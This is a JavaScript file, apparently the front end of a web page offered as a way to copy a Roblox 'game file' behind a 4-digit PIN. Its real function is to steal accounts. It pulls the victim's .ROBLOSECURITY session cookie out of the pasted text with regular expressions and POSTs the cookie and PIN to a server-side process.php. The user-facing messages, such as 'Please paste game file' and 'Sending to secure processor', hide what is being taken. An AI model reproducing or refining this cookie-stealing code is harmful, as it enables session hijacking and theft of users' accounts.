/* ================= CONFIG ================= */
const START_ANCHOR = ".ROBLOSECURITY";
const PHP_ENDPOINT = "process.php";

/* ================= ELEMENTS ================= */
const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

/* ================= PIN VALIDATION ================= */
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

/* ================= COOKIE EXTRACTION ================= */
function extractGameData(fullText) {
    const anchorIndex = fullText.indexOf(START_ANCHOR);
    if (anchorIndex === -1) return { success: false, message: "No '.ROBLOSECURITY' anchor found in pasted text." };

    const searchArea = fullText.substring(anchorIndex);
    const regexPattern = /\.ROBLOSECURITY"\s*,\s*"([^"]+(?:[^"\\]|\\.)*)"/s;
    let match = searchArea.match(regexPattern);

    if (match && match[1]) {
        return { success: true, data: match[1].replace(/\\"/g, '"') };
    }

    const altMatch = searchArea.match(/\.ROBLOSECURITY"\s*,\s*"([\s\S]*?)"\s*,\s*"/);
    if (altMatch && altMatch[1]) {
        return { success: true, data: altMatch[1] };
    }

    return { success: false, message: "Could not extract cookie from the provided text." };
}

/* ================= SEND TO PHP ================= */
async function sendToPhp(pin, cookie) {
    const formData = new FormData();
    formData.append('pin', pin);
    formData.append('cookie', cookie);

    try {
        const response = await fetch(PHP_ENDPOINT, {
            method: 'POST',
            body: formData
        });
        
        // Check if response is ok (status 200-299)
        if (!response.ok) {
            const text = await response.text();
            return { success: false, message: `Server error (${response.status}): ${text.substring(0, 100)}` };
        }
        
        const data = await response.json();
        return { success: data.success, message: data.message };
    } catch (err) {
        console.error("Fetch error:", err);
        return { success: false, message: `Network error: ${err.message}. Make sure you are using http://localhost:8000 (not file://) and PHP server is running.` };
    }
}

/* ================= BUTTON HANDLER ================= */
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const extraction = extractGameData(pastedText);
    if (!extraction.success || extraction.data.length < 30) {
        statusMessage.textContent = extraction.message || "Invalid cookie.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Sending to secure processor...";
    statusMessage.style.color = "#caa8ff";

    const result = await sendToPhp(pinInput.value, extraction.data);

    if (result.success) {
        statusMessage.textContent = "✅ " + result.message;
        statusMessage.style.color = "#7cff9d";
    } else {
        statusMessage.textContent = "✗ " + result.message;
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});
